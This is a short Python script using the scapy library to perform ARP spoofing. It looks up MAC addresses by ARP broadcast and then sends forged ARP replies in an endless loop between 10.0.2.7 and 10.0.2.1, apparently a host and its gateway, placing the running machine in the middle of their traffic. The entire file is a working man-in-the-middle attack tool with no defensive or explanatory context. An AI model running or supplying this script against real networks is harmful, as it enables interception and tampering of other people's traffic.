#!/usr/bin/env  python

import scapy.all as scapy
import time

def toList_scapy_field_info(object_):
    scapy.ls(object_)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    # op=2 ARP response, pdst : target machine IP
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(packet.show())
    print(packet.summary())
    scapy.send(packet)

while True:
    spoof("10.0.2.7", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.7")